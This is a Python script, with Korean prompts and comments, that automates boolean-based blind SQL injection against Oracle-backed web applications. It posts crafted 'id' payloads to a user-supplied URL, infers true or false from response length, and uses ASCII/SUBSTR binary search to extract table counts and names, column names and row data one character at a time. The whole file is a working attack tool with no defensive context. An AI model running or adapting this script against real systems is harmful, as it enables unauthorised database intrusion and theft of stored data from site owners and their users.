import urllib.parse
import requests
from bs4 import BeautifulSoup as bs
import json
import re

url = ""
tlen = 0
flen = 0
def sendData(atkquery):
    input_values = {'id': atkquery}
    data = urllib.parse.urlencode(input_values)
    headers = {'Content-type': 'application/x-www-form-urlencoded; charset=utf-8'}
    response = requests.post(url, data=data, headers=headers)
    return len(response.text)
    

def countTables():
    print("\n테이블 개수 검색중...")
    global tlen
    global flen
    comp = 0
    temp = 0
    count = 1
    for num in range(0, 20):

        atkquery = f"' or (SELECT COUNT(table_name) FROM user_tables) = { str(num) } -- " #어차피 table명은 문자로 시작하므로 다를 때 색출하면 됨
        temp = sendData(atkquery)

        if(comp != 0 and comp != temp):
            tlen = temp
            return count
        else:
            flen = temp
            comp = temp
        if(num!=0):
            count += 1

        

def searchTableName(table_num):
    print("\n테이블 이름 검색중...")
    global tlen
    global flen
    letterNum = 1
    table_name = ""
    low = 33
    high = 128
   
   
    while 1:
        
        while low <= high:
            mid = (low + high) // 2
            atkquery = f"' or ASCII(SUBSTR((SELECT table_name FROM (SELECT ROWNUM AS RNUM, table_name FROM user_tables) WHERE RNUM = {table_num} ), {letterNum}, 1)) < {mid} -- "
   
            temp = sendData(atkquery)
            if(temp == tlen):
                high = mid - 1
            else:
                low = mid + 1
        
        letterNum += 1
        endquery = f"' or ASCII(SUBSTR((SELECT table_name FROM (SELECT ROWNUM AS RNUM, table_name FROM user_tables) WHERE RNUM = {table_num} ), {letterNum}, 1)) > 0 -- "
    
        table_name += chr(low-1)
        print(table_name)

        if(sendData(endquery) != tlen):
            break
        low = 33
        high = 128
        
    return table_name


def countColumns(table_name):
    print("\n컬럼 개수 검색중...")
    global tlen
    global flen
    comp = 0
    temp = 0
    count = 1
    for num in range(1, 20):

        atkquery = f"' or (SELECT COUNT(column_name) FROM all_tab_columns WHERE table_name='{table_name}') = { str(num) } -- " #어차피 column명은 문자로 시작하므로 다를 때 색출하면 됨
        temp = sendData(atkquery)

        if(comp != 0 and comp != temp):
            tlen = temp
            return count
        else:
            flen = temp
            comp = temp
        count += 1

        

def searchColumnName(column_num, table_name):
    print("\n컬럼 이름 검색중...")
    global tlen
    global flen
    letterNum = 1
    column_name = ""
    low = 33
    high = 128
   
   
    while 1:
        
        while low <= high:
            mid = (low + high) // 2
            atkquery = f"' or ASCII(SUBSTR((SELECT column_name FROM (SELECT ROWNUM AS RNUM, column_name FROM all_tab_columns WHERE table_name ='{table_name}') WHERE RNUM = {column_num} ), {letterNum}, 1)) < {mid} -- "
   
            temp = sendData(atkquery)
            if(temp == tlen):
                high = mid - 1
            else:
                low = mid + 1
        
        
        letterNum += 1
        endquery = f"' or ASCII(SUBSTR((SELECT column_name FROM (SELECT ROWNUM AS RNUM, column_name FROM all_tab_columns WHERE table_name ='{table_name}') WHERE RNUM = {column_num} ), {letterNum}, 1)) > 0 -- "
    
        column_name += chr(low-1)
        print(column_name)
        if(sendData(endquery) != tlen):
            break
        low = 33
        high = 128
        
    return column_name

def countData(table_name, column_name):
    print("\n컬럼 개수 검색중...")
    global tlen
    global flen
    comp = 0
    temp = 0
    count = 1
    for num in range(1, 20):

        atkquery = f"' or (SELECT COUNT({column_name}) FROM {table_name} ) = {str(num) } -- " #어차피 column명은 문자로 시작하므로 다를 때 색출하면 됨
        temp = sendData(atkquery)

        if(comp != 0 and comp != temp):
            tlen = temp
            return count
        else:
            flen = temp
            comp = temp
        count += 1

        

def searchDataName(data_num, table_name, column_name):
    print("\n컬럼 이름 검색중...")
    global tlen
    global flen
    letterNum = 1
    data_name = ""
    low = 33
    high = 128
   
   
    while 1:
        
        while low <= high:
            mid = (low + high) // 2
            atkquery = f"' or ASCII(SUBSTR((SELECT {column_name} FROM (SELECT ROWNUM AS RNUM, {column_name} FROM {table_name}) WHERE RNUM = {data_num} ), {letterNum}, 1)) < {mid} -- "
   
            temp = sendData(atkquery)
            if(temp == tlen):
                high = mid - 1
            else:
                low = mid + 1
        
        
        letterNum += 1
        endquery = f"' or ASCII(SUBSTR((SELECT {column_name} FROM (SELECT ROWNUM AS RNUM, {column_name} FROM {table_name}) WHERE RNUM = {data_num} ), {letterNum}, 1)) > 0 -- "
    
        data_name += chr(low-1)
        print(data_name)
        if(sendData(endquery) != tlen):
            break
        low = 33
        high = 128
        
    return data_name

def main():
    global url
    global tlen
    global flen
    url = input("Blind SQLi를 실행하고자 하는 URL을 입력해주세요:")

  
    print("테이블 개수 : ", str(countTables()))
    table_name = searchTableName(int(input("몇 번째 테이블의 이름을 확인하시겠습니까? : ")))
    print("테이블 이름 : ", table_name)

    print("컬럼 개수 : ", str(countColumns(table_name)))
    column_name = searchColumnName(int(input("몇 번째 컬럼의 이름을 확인하시겠습니까? : ")), table_name)
    print("컬럼 이름 : ", column_name)

    print("데이터 개수 : ", str(countData(table_name, column_name)))
    data_name = searchDataName(int(input("몇 번째 데이터의 이름을 확인하시겠습니까? : ")), table_name, column_name)
    print("데이터 이름 : ", data_name)

if __name__ == "__main__":
    main()